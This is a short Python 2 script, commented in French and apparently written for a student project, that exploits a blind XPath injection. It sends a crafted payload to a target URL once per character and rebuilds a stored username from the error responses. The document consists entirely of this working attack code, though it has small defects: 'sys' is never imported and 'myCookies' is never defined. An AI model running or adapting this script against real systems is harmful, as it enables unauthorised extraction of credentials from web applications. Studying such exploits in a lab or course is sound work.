#!/usr/bin/python2
# -*- coding: utf-8 -*-
#
#	Auteur	: Ntfd.
#	Cadre	: Projet tuteur√©
#	But 	: Exploiter une xpath blind injection 	
#	Licence	: WTFPL
#
##########################################



import requests, string

url = sys.argv[1]
CHARSET = string.lowercase + string.uppercase + string.digits

buffer = ""
for i in xrange(1, 29+1):
	for _ in CHARSET:
		payload = '" and substring(/Username,%s,1)="%s" and "admin"="admin' %( i, _)
		response = requests.get( url + payload, cookies=myCookies).text
		if "Authentification impossible." not in response:
			buffer += _
			print i, _, "GOOD"
			break
		else:
			print i, _

print buffer

